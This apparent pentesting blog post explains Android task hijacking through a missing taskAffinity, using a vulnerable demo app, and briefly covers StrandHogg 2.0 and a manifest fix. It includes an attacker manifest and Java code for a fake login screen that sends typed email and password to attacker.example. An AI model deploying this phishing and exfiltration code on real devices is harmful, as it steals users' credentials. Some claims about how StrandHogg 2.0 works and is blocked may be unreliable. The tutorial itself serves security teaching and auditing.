---
title: Android - Task Hijacking and StrandHogg 2.0
author: nirajkharel
date: 2026-06-11 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, Task Hijacking, StrandHogg]
render_with_liquid: false
---


Android manages activities in stacks called tasks. Each task has a `taskAffinity` — a string that determines which task an activity belongs to. When no `taskAffinity` is declared on an activity, Android assigns the app's package name as the default. An attacker app that claims the same affinity with `launchMode="singleTask"` can insert itself into the victim's task. On Android ≤ 10, the next time the user opens the victim app from the launcher, the attacker's screen appears instead.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/AndroidManifest.xml</code> (<code>MainActivity</code> — no <code>taskAffinity</code> set)</li>
  </ul>
</aside>

<br>**Where is the vulnerability?**

```bash
grep -A 6 'MainActivity' AndroidManifest.xml
```

```xml
<activity android:name=".MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

No `android:taskAffinity` attribute. Android assigns the default — the package name: `com.vulnlab.app`. Any other app that claims this exact affinity with `launchMode="singleTask"` becomes eligible to hijack VulnLabApp's task.

<br>**How do you confirm the affinity at runtime?**

```bash
adb shell am start -n com.vulnlab.app/.MainActivity
adb shell dumpsys activity activities | grep -A 2 "com.vulnlab.app" | grep taskAffinity
# taskAffinity=com.vulnlab.app
```

Frida confirms the same from within the process:

```javascript
Java.perform(function () {
  const Main = Java.use('com.vulnlab.app.MainActivity');
  Main.onCreate.overload('android.os.Bundle').implementation = function (b) {
    console.log('[task-hijack] task=' + this.getTaskId()
      + ' affinity defaults to package name — exploitable on Android <= 10');
    this.onCreate(b);
  };
});
```

```bash
adb shell am start -n com.vulnlab.app/.MainActivity
# [task-hijack] task=42 affinity defaults to package name — exploitable on Android <= 10
```

<br>**What would an attacker build?**

An attacker creates a separate app and declares one activity that claims VulnLabApp's affinity:

```xml
<!-- attacker app manifest -->
<activity android:name=".PhishingActivity"
    android:exported="true"
    android:taskAffinity="com.vulnlab.app"
    android:launchMode="singleTask">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

The attacker's `PhishingActivity` clones VulnLabApp's login screen. When the user enters credentials and taps login, it exfiltrates them and immediately forwards to the real VulnLabApp:

```java
loginBtn.setOnClickListener(v -> {
    String email    = emailField.getText().toString();
    String password = passField.getText().toString();

    // exfiltrate
    new Thread(() -> {
        try {
            new OkHttpClient().newCall(new Request.Builder()
                .url("https://attacker.example/?e=" + email + "&p=" + password)
                .build()).execute();
        } catch (IOException ignored) {}
    }).start();

    // forward to real app so the user sees the expected flow
    Intent real = getPackageManager().getLaunchIntentForPackage("com.vulnlab.app");
    if (real != null) {
        real.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(real);
    }
    finish();
});
```

**Attack flow (Android ≤ 10):**

1. Attacker installs their app and runs `PhishingActivity` once — plants it in the `com.vulnlab.app` task.
2. User sends the attacker app to the background.
3. User taps VulnLabApp's icon in the launcher.
4. Android finds the existing task with affinity `com.vulnlab.app` (the attacker's) and brings it to front.
5. User sees the phishing login screen, assumes it is VulnLabApp.

> **Android version constraint.** Android 11 changed how `FLAG_ACTIVITY_RESET_TASK_IF_NEEDED` resolves cross-app task affinity collisions: when the found task's root belongs to a different package, the system resets that slot and starts the real app's activity instead. The classic `taskAffinity + singleTask` path works on **Android ≤ 10** only.

<br>**What does StrandHogg 2.0 add?**

The 2020 variant (CVE-2020-0096) skipped `taskAffinity` declarations entirely. It used reflection to call internal task-reparenting APIs, inserting the attacker's activity into the victim's existing task with no manifest signal to grep for — invisible in static analysis. Google patched it in the May 2020 security update. Apps targeting API 30+ are protected. Apps with `targetSdkVersion < 30` on older devices remain exposed.

<br>**What is the fix?**

Set these on every launcher and authentication activity:

```xml
android:taskAffinity=""
android:allowTaskReparenting="false"
android:launchMode="standard"
```

`taskAffinity=""` removes the default package-name affinity so no external app can match it. `allowTaskReparenting="false"` blocks the StrandHogg 2.0 reparenting path. Combined with `targetSdkVersion >= 30`, both vectors are closed.

<br>**Closing**

The vulnerability is a one-line omission: `android:taskAffinity` not declared on `MainActivity`. Android silently fills in the package name, making the task claimable by any other installed app. The fix is equally one line. When auditing, grep every launcher and authentication activity for a missing or empty `taskAffinity`. Note the device OS — apps on Android ≤ 10 are exposed to the classic variant regardless of target SDK.

Happy Hacking !!
